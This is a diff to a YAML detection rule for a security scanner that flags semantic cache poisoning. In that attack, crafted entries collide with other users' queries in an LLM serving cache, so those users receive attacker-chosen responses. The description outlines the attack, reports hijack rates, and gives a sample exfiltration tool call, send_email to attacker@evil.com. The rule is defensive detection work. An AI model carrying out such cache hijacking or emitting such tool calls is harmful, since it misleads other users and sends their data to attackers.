@@ -1,31 +1,17 @@
 id: rp-029
 name: "Semantic Cache Poisoning Detector"
 version: "0.2.0"
-description: >
-  Detects semantic cache poisoning attacks where adversaries inject crafted entries into
-  LLM semantic caching infrastructure (AWS ElastiCache AI, Azure Semantic Cache, LangChain
-  GPTCache) to cause other users to receive attacker-defined responses via embedding
-  vector key collisions. CacheAttack (arXiv:2601.23088, Jan 2026) achieves 86% response
-  hijacking rate across AWS, Azure, and Alibaba Cloud deployments. NDSS 2026 paper confirms
-  the attack works at all three major public clouds. Distinct from rp-009 (RAG Knowledge
-  Base Poisoning) which monitors retrieval content for override language — this rule detects
-  kill-chain canary token propagation (arXiv:2603.28013), cache injection metadata markers,
-  and agent tool calls reflecting injected LLM responses. The key difference: semantic
-  cache poisoning targets the serving-layer cache between the user query and LLM, not the
-  vector store behind RAG retrieval.
-  v0.2.0: Added Signal 6 (cache_id propagation + downstream forward/exfil verb) to catch
-  evasion variant where attacker-controlled cache entries carry a `cache_entry_id` or
-  `served_from_cache` field to track cross-user propagation without explicit poison labels.
-  Also added promptfoo LMVD-9a07c0f2 (Jan 2026) to references.
-  References: OWASP LLM01:2025, OWASP LLM02:2025, NDSS 2026, arXiv:2601.23088 (CacheAttack,
-  Jan 2026), arXiv:2603.28013 (Kill-Chain Canaries, MIT/UChicago Mar 2026),
-  promptfoo LMVD-9a07c0f2 (Semantic Cache Collision Hijack) -
-  https://arxiv.org/abs/2601.23088,
-  https://www.ndss-symposium.org/ndss-paper/when-cache-poisoning-meets-llm-systems-semantic-cache-poisoning-and-its-countermeasures/,
-  https://arxiv.org/abs/2603.28013,
-  https://www.promptfoo.dev/lm-security-db/vuln/semantic-cache-collision-hijack-9a07c0f2,
-  https://github.com/dequeueing/SemanticCache_Poisoning,
+description: |
+  Detects semantic cache poisoning attacks where adversaries inject crafted entries into LLM semantic caching infrastructure (AWS ElastiCache AI, Azure Semantic Cache, LangChain GPTCache) to cause other users to receive attacker-defined responses via embedding vector key collisions. CacheAttack (arXiv:2601.23088, Jan 2026) achieves 86% response hijacking rate across AWS, Azure, and Alibaba Cloud deployments. NDSS 2026 paper confirms the attack works at all three major public clouds. Distinct from rp-009 (RAG Knowledge Base Poisoning) which monitors retrieval content for override language — this rule detects kill-chain canary token propagation (arXiv:2603.28013), cache injection metadata markers, and agent tool calls reflecting injected LLM responses. The key difference: semantic cache poisoning targets the serving-layer cache between the user query and LLM, not the vector store behind RAG retrieval. v0.2.0: Added Signal 6 (cache_id propagation + downstream forward/exfil verb) to catch evasion variant where attacker-controlled cache entries carry a `cache_entry_id` or `served_from_cache` field to track cross-user propagation without explicit poison labels. Also added promptfoo LMVD-9a07c0f2 (Jan 2026) to references.
+
+  References: OWASP LLM01:2025, OWASP LLM02:2025, NDSS 2026, arXiv:2601.23088 (CacheAttack, Jan 2026), arXiv:2603.28013 (Kill-Chain Canaries, MIT/UChicago Mar 2026), promptfoo LMVD-9a07c0f2 (Semantic Cache Collision Hijack) -
+  - https://arxiv.org/abs/2601.23088,
+  - https://www.ndss-symposium.org/ndss-paper/when-cache-poisoning-meets-llm-systems-semantic-cache-poisoning-and-its-countermeasures/,
+  - https://arxiv.org/abs/2603.28013,
+  - https://www.promptfoo.dev/lm-security-db/vuln/semantic-cache-collision-hijack-9a07c0f2,
+  - https://github.com/dequeueing/SemanticCache_Poisoning,
   Example: tool_result contains "SECRET-A4F2C8" (kill-chain canary propagation token, arXiv:2603.28013) or assistant_message calls "send_email(to='attacker@evil.com')" triggered by cache-hijacked LLM response
+
 severity: critical
 category: prompt_injection_and_hijacking
 fp_rate: low
